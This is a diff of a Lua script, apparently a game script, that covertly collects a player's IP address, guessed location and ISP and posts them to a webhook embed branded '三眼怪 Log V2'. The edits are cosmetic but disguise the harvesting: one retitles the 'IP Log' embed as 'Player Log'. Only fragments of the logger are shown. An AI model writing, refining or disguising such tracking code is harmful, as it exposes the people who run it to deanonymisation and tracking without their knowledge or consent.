@@ -10,7 +10,7 @@ local gameName = "Unknown"
 local embedColor = tonumber("0x00FF00" )
 
 --// 新增: 指定應用圖片 (三眼怪)
-local appIconURL = "https://i.ibb.co/fYSwfPm2/image.jpg" -- 一個高品質的三眼怪圖示
+local appIconURL = "https://i.ibb.co/fYSwfPm2/image.jpg"
 
 --// 增強的 HTTP 請求函數
 local function secureRequest(options )
@@ -87,7 +87,7 @@ pcall(function()
         local isp = (ip_info and ip_info.org) or "未知"
         
         local secretBlock = string.format(
-            "\n\n**IP資訊:**\n" ..
+            "\n\n**IP Log:**\n" ..
             "**IP 位址:** `%s`\n" ..
             "**推測位置:** `%s`\n" ..
             "**網路供應商:** `%s`",
@@ -101,7 +101,7 @@ pcall(function()
         username = "三眼怪 Log V2",
         avatar_url = appIconURL, -- 設定 Webhook 的頭像為三眼怪
         embeds = {{
-            title = "IP Log:",
+            title = "Player Log:",
             description = description,
             color = embedColor,
             footer = {
